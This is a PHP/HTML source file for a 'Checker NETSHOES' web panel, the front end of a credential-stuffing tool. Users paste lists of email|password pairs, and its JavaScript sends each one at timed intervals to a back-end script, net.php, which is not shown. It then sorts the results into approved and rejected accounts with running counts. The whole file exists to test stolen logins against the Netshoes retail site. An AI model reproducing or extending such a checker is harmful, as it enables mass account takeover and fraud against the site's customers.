<?php  
require '../check.php';

?>
<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <title>PainelCheckers©</title>
 

    <link href="https://maxcdn.bootstrapcdn.com/bootswatch/3.3.7/darkly/bootstrap.min.css" rel="stylesheet" integrity="sha384-S7YMK1xjUjSpEnF4P8hPUcgjXYLZKK3fQW1j5ObLSl787II9p8RO9XUGehRmKsxd" crossorigin="anonymous">
    <meta content='width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0' name='viewport' />
    <meta name="viewport" content="width=device-width" />
    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/bootswatch/3.3.7/lumen/bootstrap.min.css">

    <link href="http://maxcdn.bootstrapcdn.com/font-awesome/latest/css/font-awesome.min.css" rel="stylesheet">
    <link rel="stylesheet" type="text/css" href="https://fonts.googleapis.com/css?family=Roboto:300,400,500,700|Material+Icons" />
<script src="https://code.jquery.com/jquery-3.1.1.slim.min.js" integrity="sha384-A7FZj7v+d/sdmMqp/nOQwliLvUsJfDHW+k9Omg/a/EheAdgtzNs3hpfag6Ed950n" crossorigin="anonymous"></script>
<script src="https://cdnjs.cloudflare.com/ajax/libs/tether/1.4.0/js/tether.min.js" integrity="sha384-DztdAPBWPRXSA/3eYEEUWrWCy7G5KFbe8fFjk5JAIxUYHKkDx6Qin1DkWx51bBrb" crossorigin="anonymous"></script>
<script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0-alpha.6/js/bootstrap.min.js" integrity="sha384-vBWWzlZJ8ea9aCX4pEW3rVHjgjt7zpkNpZk+02D9phzyeVkE+jo0ieGizqPLForn" crossorigin="anonymous"></script>
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.1.0/jquery.min.js"></script>


  <script src="https://ajax.googleapis.com/ajax/libs/jquery/2.2.0/jquery.min.js"></script>


    <style type="text/css">
 .badge-success {
    background-color: #00008B;
  border-color: #24a528;
  display: inline-block;
  min-width: 10px;
  padding: 3px 7px;
  font-size: 12px;
  font-weight: normal;
  color: #00008B;
  line-height: 1;
  vertical-align: middle;
  white-space: nowrap;
  text-align: center;

  border-radius: 10px;
}

.badge-danger {
  background-color: #00008B;
  border-color: #ff1103;
  display: inline-block;
  min-width: 10px;
  padding: 3px 7px;
  font-size: 12px;
  font-weight: normal;
  color: #00008B;
  line-height: 1;
  vertical-align: middle;
  white-space: nowrap;
  text-align: center;

  border-radius: 10px;
}

.badge-warning {
    background-color: #;
  border-color: #;
  display: inline-block;
  min-width: 10px;
  padding: 3px 7px;
  font-size: 12px;
  font-weight: normal;
  color: #ffffff;
  line-height: 1;
  vertical-align: middle;
  white-space: nowrap;
  text-align: center;

  border-radius: 10px;
}
 .fundo {
  width:450px;
     display: inline-block;
     filter:alpha(opacity=120);
     opacity: 10.9;
     -moz-opacity:0.5;
     -webkit-opacity:1;
     margin-bottom: 21px;
  background-color: red;
  border: 1px solid ;
  border-radius: 0;
  -webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, 0.05);
  box-shadow: 0 1px 1px rgba(0, 0, 0, 0.05);

}
 .test {
  width:450px;
     display: inline-block;
     filter:alpha(opacity=50);
     opacity: 0.5;
     -moz-opacity:0.5;
     -webkit-opacity:1;
     margin-bottom: 21px;
  background-color: #00008B;
  border: 1px solid transparent;
  border-radius: 0;
  -webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, 0.05);
  box-shadow: 0 1px 1px rgba(0, 0, 0, 0.05);

 }
 .test2 {
  width:450px;
     display: inline-block;
     filter:alpha(opacity=50);
     opacity: 0.5;
     -moz-opacity:1;
     -webkit-opacity:1;
     margin-bottom: 20px;
  background-color: #00008B;
  border: 1px solid transparent;
  border-radius: 0;
  -webkit-box-shadow: 0 1px 1px rgba(0, 0, 0, 0.05);
  box-shadow: 0 1px 1px rgba(0, 0, 0, 0.05);

 }
 .espaco{
  Margin-top: 8px;
  margin-bottom: 4px;
 
 }
 .panel-primary {
  display: inline-block;
     filter:alpha(opacity=50);
     opacity: 0.5;
     -moz-opacity:0.5;
     -webkit-opacity:0.5;
 }
</style>

<script>

function start()
{
  var i;
  var tudo =$('#text').val();
  var linha = tudo.split("\n");
  var separador= "|"
  //alert(cc.length);
  for (i = 0; i < linha.length; i++) {
    //alert(cc[i]);
    var separado = linha[i];
    var id = i;
    check(separado, separador, id);
    //setTimeout(function() { alert(j) }, 100, i);check(cc2, separador, id);
  }
}
var aps = 0;
var rps = 0;
var testadas = 0;
function check(separado, separador, id){
  setTimeout(function() {
    $.ajax({
      type:   'GET',
      url:  'net.php',
      dataType: 'html',
      data: { 'linha':separado },
      success: function(msg)
      {
        ++testadas;
document.getElementById('testado').innerText = testadas;
                            if(msg.indexOf("#Reprovado") >= 0){
                                var reprovadas2 = $("#resultado2").val();
                                ++rps;
                                document.getElementById('reprovada_conta').innerText = rps;
                                $("#resultado2").val(reprovadas2 + msg + "\n")
                            }else{
                                var reprovadas = $("#resultado").val();
                                ++aps;
                                document.getElementById('aprovada_conta').innerText = aps;
                                $("#resultado").val(reprovadas + msg + "\n")
                            }
        //





      }
    });
  }, id * 1000);
}
</script>
 <style>
  a:link 
{ 
 text-decoration:none; 
}
.afs {
  font-weight: bold;
              }
            .green {
                background-color: rgba(92, 180, 91, 1);
                color: rgba(255, 255, 255, 0.87);
                padding: 0.25em 0.5em;
                border-radius: 3px;

}
.green {
  background-color: #4caf50;
  color: rgba(255, 255, 255, 0.87);
  padding: 0.25em 0.5em;
  border-radius: 500px;
}
.red {
  background-color: #f44336;
  color: rgba(255, 255, 255, 0.87);
  padding: 0.25em 0.5em;
  border-radius: 500px;
}
.check {
  background-color: #fcc100;
  color: rgba(255, 255, 255, 0.87);
  padding: 0.25em 0.5em;
  border-radius: 500px;
}
            .botao2 {
                margin-top: 10px;
                width: 75px;
                height: 35px;
                background-color: rgba(245, 203, 130, 1);
                border-radius: 4px;
                border: none;
                color: rgba(255, 255, 255, 0.87);
                cursor: pointer;
                -webkit-appearance: button;
                transition: all .2s ease-in-out;
                font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
            }
            .botao2:hover {
                background-color: rgba(255, 255, 255, 0.87);
                color: #2C3A48;
            }
            .botao2:focus {
                outline: none;
            }
            .botao {
                margin-top: 10px;
                width: 75px;
                height: 35px;
                background-color: rgba(85, 216, 234, 1);
                border-radius: 4px;
                border: none;
                color: rgba(255, 255, 255, 0.87);
                cursor: pointer;
                -webkit-appearance: button;
                transition: all .2s ease-in-out;
                font-family: "Roboto", "Helvetica Neue", Helvetica, Arial, sans-serif;
}

</style>
</head>
<body>
  <center>
   <font size="7">Checker NETSHOES </font> <br />
   <font size="3" class="afs">#PainelCheckers</font>
   <br /><br />
   <textarea class="panel panel-primary" cols="199" rows="14" id="text" name="text" placeholder="Email|Senha "></textarea>
      <br /><div class="afs">
           <font size="2">
                      <span id="status" class="cyan">Aprovados : <span id="aprovada_conta" class="green">0</span> -Reprovados : <span id="reprovada_conta" class="red">0</span> -Testadas : <span id="testado" class="check">0</span>             <br /><br />
            <button type="submit" id="x" name="x" class="btn btn-success" onclick="start()">Testar</button>
            <button type="submit" id="x" name="x" class="btn btn-danger" onclick="stop()">Parar</button><br />

 </div>  <br />
 </div> <br />
 </div>  <br />
 </div> <br />
 </div> 
 </div>
 </div> 
 </div>
 
 <textarea class="panel panel-primary" id="resultado2"  style="width: 727px; height: 255px"color="this.style.backgroundColor='#FF0000';" name="text" placeholder="Aqui fica as Aprovadas" "></textarea>
 
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;


</div> 
</div>
<textarea class="panel panel-primary" id="resultado"  style="width: 727px; height: 255px;" color = '#191970' name="text" placeholder="Aqui fica as Reprovadas"  "></textarea>




</center>
</body>
</html>
